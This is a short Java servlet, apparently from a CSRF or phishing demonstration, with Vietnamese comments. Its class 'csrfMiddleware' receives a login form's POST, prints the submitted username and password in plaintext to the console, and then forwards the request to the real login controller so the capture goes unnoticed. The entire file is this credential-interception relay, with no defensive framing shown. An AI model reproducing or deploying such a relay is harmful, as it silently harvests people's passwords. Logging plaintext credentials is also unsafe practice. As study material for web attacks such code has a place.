import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

//Xác định URL trung gian
@WebServlet("/middleware")
public class csrfMiddleware extends HttpServlet{
	private static final long serialVersionUID = 1L;
    @Override
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {}
	@Override
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		response.setContentType("text/html;charset=UTF-8");
		//Lấy giá trị username và password tương ứng trong request
		String username = request.getParameter("txtUsername");
        String password = request.getParameter("txtPassword");
        // In giá trị username và password ra màn hình console
        System.out.println("Username: "+username);
        System.out.println("Password: "+password);
        
        //Tiếp tục gửi request đến trang đăng nhập gốc
        request.getRequestDispatcher("/LoginController").forward(request, response);
		}	
}
